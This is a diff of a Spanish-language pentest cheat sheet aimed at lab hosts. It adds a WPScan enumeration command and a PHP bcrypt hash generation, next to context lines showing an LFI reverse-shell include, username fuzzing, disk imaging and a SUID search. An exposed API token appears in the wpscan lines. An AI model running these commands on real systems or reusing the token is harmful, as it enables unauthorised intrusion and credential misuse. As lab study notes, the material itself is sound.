@@ -100,6 +100,7 @@ http://10.10.10.55/?file=../../../../var/lib/tftpboot/rev.php
 
 escaneo agresivo de wordpress
 wpscan --url http://10.10.10.88/webservices/wp/ -e ap --api-token  hz6s59smi5hjaWUXjdx1brjEGW08CQsBrOGFWP3lTmc --plugins-detection aggressive  
+wpscan --url http://10.10.10.37 -e u,ap,tt,t  --api-token  hz6s59smi5hjaWUXjdx1brjEGW08CQsBrOGFWP3lTmc
 
 wfuzz -z file,/usr/share/seclists/Usernames/Names/names.txt -d "username=FUZZ&password=1234567" --hs "No account found with that username" http://10.10.10.97/login.php
 
@@ -398,3 +399,12 @@ scp user@10.10.10.48:/home/pi/usb.dd .
 sudo dcfldd if=/dev/sdb of=/home/pi/usb.dd
 ****************************************************Buscar archivos en el sistema con permisos owner SUID************************************
 find / -perm -4000 2>/dev/null | xargs ls -la
+**************************************************Crear hash de php****************************************************************************
+|-------(root@kali)-------|(~)
+|
+|-->{SFire129}#php -a
+Interactive mode enabled
+
+php > echo password_hash('cmd', PASSWORD_DEFAULT);
+$2y$10$2Q9eIXcbrxiFG0G9pLPzJu503fG67yj77kP6msbi0b6OWf2uzM2M2
+php >
